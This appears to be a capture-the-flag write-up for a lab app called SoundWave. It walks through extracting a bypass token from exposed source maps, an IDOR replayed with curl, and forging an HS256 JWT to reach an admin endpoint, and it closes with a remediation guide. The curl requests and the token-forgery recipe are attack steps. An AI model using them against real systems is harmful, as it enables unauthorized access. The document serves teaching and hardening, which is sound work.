# SoundWave: Solution Walkthrough & Hardening Guide

---

## 🗺️ Vulnerability Chain Summary

```mermaid
graph TD
    A[Phase 1: Web Player Port 80] -->|Inspect Sources Tab / Chunk Map| B(Leaked dev-defaults.ts)
    B -->|Extract bypass token| C[SOUNDWAVE_DEV_BYPASS_TOKEN = [REDACTED]]
    C -->|Replay GET /api/v1/episodes/view?id=100| D{Phase 2: IDOR with Bypass Header}
    D -->|Extract JWT secret| E[JWT_SECRET = [REDACTED]]
    E -->|Forge HS256 JWT claim role: editor| F{Phase 3: JWT Forgery}
    F -->|POST /api/v1/admin/verify| G[Flag Captured: VulnOS{...}]
```

---

## 💀 Step-by-Step Solution

### Phase 1: Webpack Source Map Reconnaissance

1. **Information Gathering:**
   Access the web application homepage at `http://<TARGET_IP>/`. You are presented with a premium AI audio normalization player.

2. **Source Map Identification:**
   Inspect the browser developer tools (F12) and check the **Sources** tab (or **Debugger** in Firefox). Look under the webpack file structure (`_next/static/chunks/`). Because Next.js production source maps are enabled, the original unminified React source code directory is fully exposed.

3. **Locating the Bypass Token:**
   Navigate the source tree to `src/config/dev-defaults.ts` (or search the map file for configuration keywords).
   
   The unminified file reveals hardcoded developer settings:
   ```typescript
   export const SOUNDWAVE_DEV_BYPASS_TOKEN = "[REDACTED]";
   export const STAGING_API_ENDPOINT = "http://localhost:5000/api/v1";
   export const DEBUG_MODE = true;
   ```
   Save the bypass token value: `[REDACTED]`.

---

### Phase 2: Insecure Direct Object Reference (IDOR)

1. **Analyzing API Requests:**
   When using the player, monitor the **Network** tab in Developer Tools. The web player loads track metadata by hitting a backend API:
   ```http
   GET /api/v1/episodes/view?id=101 HTTP/1.1
   Host: <TARGET_IP>
   ```

2. **Identifying the IDOR Vulnerability:**
   The parameter `id=101` represents a sequential ID in the MongoDB database. Attempting to access `id=100` (which is a logical private increment) results in a `403 Forbidden` response:
   ```json
   {
     "error": "Access Denied",
     "message": "This episode is private. Staging/dev bypass token required."
   }
   ```

3. **Bypassing Access Control:**
   Using the token discovered in Phase 1 (`[REDACTED]`), replay the request adding the `X-Bypass-Token` header.
   
   **cURL Command:**
   ```bash
   curl -H "X-Bypass-Token: [REDACTED]" "http://<TARGET_IP>/api/v1/episodes/view?id=100"
   ```

   **JSON Response:**
   ```json
   {
     "_id": "6668725abc90372df00e1234",
     "id": 100,
     "title": "[INTERNAL ONLY] SoundWave Dev Test Stream",
     "artist": "Staging Pipeline",
     "description": "[STAGING CONF] System testing normalized master stream. Bypass Verification Token validation successful. Internal Config: JWT_SECRET=[REDACTED]. Do not share this key in production builds.",
     "duration": "0:30",
     "coverUrl": "/images/cover_100.jpg",
     "audioUrl": "/audio/dev_stream.mp3",
     "isPrivate": true
   }
   ```
   Save the leaked JWT signing key: `[REDACTED]`.

---

### Phase 3: JWT Forgery & Privilege Escalation

1. **Analyzing Admin Console Access:**
   Navigate to the Admin Console at `http://<TARGET_IP>/admin/analytics`. The dashboard is locked and requires a valid JSON Web Token (JWT) with `"role": "editor"` to grant entry.

2. **Forging the token:**
   Using a tool like `jwt.io` (or a local Node/Python script), forge a valid HS256-signed JWT token using the leaked secret.

   * **Header:**
     ```json
     {
       "alg": "HS256",
       "typ": "JWT"
     }
     ```
   * **Payload:**
     ```json
     {
       "username": "admin",
       "role": "editor"
     }
     ```
   * **Signature Key:** `[REDACTED]`

   *Example Forged JWT:*
   `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImVkaXRvciJ9.[REDACTED]`

3. **Submitting the JWT:**
   * **Option A:** Paste the forged JWT directly into the text input box on `http://<TARGET_IP>/admin/analytics` and click **"Authorize Session"**.
   * **Option B:** Replay the request directly to the API endpoint:
     ```bash
     curl -X POST -H "Content-Type: application/json" \
          -H "Authorization: Bearer <FORGED_JWT>" \
          "http://<TARGET_IP>/api/v1/admin/verify"
     ```

4. **Capturing the Flag:**
   Upon validation, the analytics interface unlocks, revealing the flag:
   `VulnOS{[REDACTED]}`

---

## 🛠️ Hardening & Remediation Guide

### 1. Disable Production Browser Source Maps
Leaving source maps enabled in production exposes the entire client-side directory structure.
* **Remediation:** In `frontend/next.config.js`, ensure `productionBrowserSourceMaps` is set to `false` (or removed, as `false` is the secure default):
  ```javascript
  module.exports = {
    productionBrowserSourceMaps: false,
  };
  ```

### 2. Secure Sensitive Keys and Staging Tokens
Bypass tokens and cryptographic secrets must never be hardcoded into the codebase.
* **Remediation:** Remove hardcoded constants from source files like `dev-defaults.ts` and use secure **Environment Variables** injected at runtime.
  ```typescript
  // Load variables at runtime instead of hardcoding
  export const SOUNDWAVE_DEV_BYPASS_TOKEN = process.env.SOUNDWAVE_DEV_BYPASS_TOKEN;
  ```

### 3. Implement Robust Access Control Checks
Relying on a static header (`X-Bypass-Token`) to bypass database authentication creates a single point of failure.
* **Remediation:** Remove staging bypass rules from production API endpoints. Enforce session-based authentication or role-based token checks for *all* private resources.
  ```javascript
  // Express Backend (Secure Approach)
  app.get('/api/v1/episodes/view', authenticateSession, async (req, res) => {
    // Check if user has permission to view private episodes
  });
  ```

### 4. Rotate and Strengthen Cryptographic Secrets
Using weak, guessable, or staging JWT secrets allows attackers to easily forge admin sessions if they recover the key.
* **Remediation:** Generate cryptographically strong, random keys (e.g., a 256-bit key) for signing JWT tokens and rotate them frequently. Never reuse staging secrets in production.
